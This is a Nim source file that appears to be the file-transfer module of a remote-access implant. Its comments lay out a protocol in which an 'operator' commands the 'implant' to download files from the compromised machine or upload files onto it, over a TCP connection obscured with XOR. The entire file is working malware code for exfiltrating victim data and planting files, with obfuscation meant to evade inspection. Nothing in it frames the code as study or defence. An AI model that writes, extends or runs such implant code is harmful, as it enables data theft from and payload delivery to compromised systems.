# filetransfer.nim — file download + upload over XOR-framed TCP connection
#
# Protocol:
#   DOWNLOAD: operator sends "download <path>\n"; implant replies "FILE_SIZE:<n>\n" + bytes
#   UPLOAD:   operator sends "upload <path> <size>\n"; implant replies "READY\n"; operator sends bytes; implant replies "OK\n" or "ERR:...\n"

import std/[net, os]

const CHUNK_SIZE = 65536

proc xorWrite(sock: Socket, data: seq[byte], key: seq[byte]) =
  if key.len == 0:
    sock.send(cast[string](data))
  else:
    var enc = newSeq[byte](data.len)
    for i, b in data:
      enc[i] = b xor key[i mod key.len]
    sock.send(cast[string](enc))

proc sendFile*(sock: Socket, path: string, xorKey: seq[byte]): bool =
  if not fileExists(path):
    let msg = cast[seq[byte]]("ERR:file not found: " & path & "\n")
    xorWrite(sock, msg, xorKey)
    return false

  let data =
    try: readFile(path).toOpenArrayByte(0, -1).toSeq
    except IOError as e:
      let msg = cast[seq[byte]]("ERR:" & e.msg & "\n")
      xorWrite(sock, msg, xorKey)
      return false

  let header = cast[seq[byte]]("FILE_SIZE:" & $data.len & "\n")
  xorWrite(sock, header, xorKey)

  var offset = 0
  while offset < data.len:
    let chunkEnd = min(offset + CHUNK_SIZE, data.len)
    xorWrite(sock, data[offset ..< chunkEnd], xorKey)
    offset = chunkEnd
  true

proc recvFile*(sock: Socket, path: string, size: int, xorKey: seq[byte]): bool =
  xorWrite(sock, cast[seq[byte]]("READY\n"), xorKey)

  var buf = newSeq[byte](size)
  var received = 0
  while received < size:
    let want = min(CHUNK_SIZE, size - received)
    var tmp  = newString(want)
    let n    =
      try: sock.recv(tmp, want)
      except OSError:
        xorWrite(sock, cast[seq[byte]]("ERR:connection dropped\n"), xorKey)
        return false
    if n == 0:
      xorWrite(sock, cast[seq[byte]]("ERR:connection dropped\n"), xorKey)
      return false
    for i in 0 ..< n:
      let b = byte(tmp[i])
      buf[received + i] = if xorKey.len == 0: b
                          else: b xor xorKey[(received + i) mod xorKey.len]
    inc received, n

  try:
    writeFile(path, cast[string](buf))
    xorWrite(sock, cast[seq[byte]]("OK\n"), xorKey)
    true
  except IOError as e:
    xorWrite(sock, cast[seq[byte]]("ERR:" & e.msg & "\n"), xorKey)
    false
